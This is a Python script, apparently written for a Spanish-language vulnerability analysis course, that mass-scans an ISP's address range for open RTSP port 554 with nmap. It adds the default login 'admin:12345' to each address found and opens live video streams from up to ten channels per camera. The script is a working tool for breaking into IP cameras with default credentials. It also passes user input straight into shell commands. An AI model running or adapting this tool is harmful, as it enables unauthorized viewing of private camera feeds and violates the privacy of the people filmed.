#!/usr/bin/env python
'''
Jonathan Perez Guzman
Analisis de vulnerabilidades II
Escaneo de camaras
Python version = 3.10
'''
import sys, os
import subprocess as sp
import re


os.system('clear')
print("Escaneo ISP reduno")
option_menu = input("1.- Escanear red \n2.- Generar archivo para realizar vizualizacion\n3.- Vizualizacion de camaras\n")
clear_screen = sp.call(["clear"], shell = True)

match option_menu:
    case "1":
        scan_ip = input("Introduce la direccion IP a escanear: ")
        text_file_name = re.sub("(\-)|(/)", "_", scan_ip)
        # Realiza el escaneo y guarda las direcciones limpias en un archivo de texto que inicia con la direccion IP escaneada
        cmd = (f'nmap -p 554 {scan_ip} --open -Pn -oG - | grep "/open" | awk \'{{print $2}}\' > {text_file_name}_resultados.txt')
        scan_ip_result = sp.call([cmd], shell = True)
        clear_screen = sp.call(["clear"], shell = True)
        print(f"{text_file_name}_resultados.txt creado en {os.getcwd()}")

    case "2":
        clear_screen = sp.call(["ls", "-l"], shell = True)
        file_user = input("Nombre del archivo para generar: ")
        with open(f"{file_user}", "r") as file_in:
            lines_r = file_in.readlines()
        add_user_pass = ['admin:12345@' +lines for lines in lines_r]
        with open(f"user_{file_user}", "w") as file_out:
            file_out.writelines(add_user_pass)
        print(f"user_{file_user}.txt creado en {os.getcwd()}")

    case "3":
        clear_screen = sp.call(["ls", "-l"], shell = True)
        vizualization_file = input("Nombre del archivo para vizualizar: ")
        v_file = open(f"{vizualization_file}", "r")
        for line in v_file:
            line = line.strip()
            ip = line[12:]
            for channel in range(1,11):
                titulo = (f"IP: {ip}, Canal {channel}")
                print(titulo)
                terminal_cmd = f"xfce4-terminal --minimize --hide-menubar --hide-toolbar --hide-scrollbar -e 'mplayer -rtsp-stream-over-tcp -framedrop -nocache rtsp://{line}:554/Streaming/channels/{channel}01 -geometry 500x500 -title {line}'"
                terminal_generate = sp.call([terminal_cmd], shell = True)
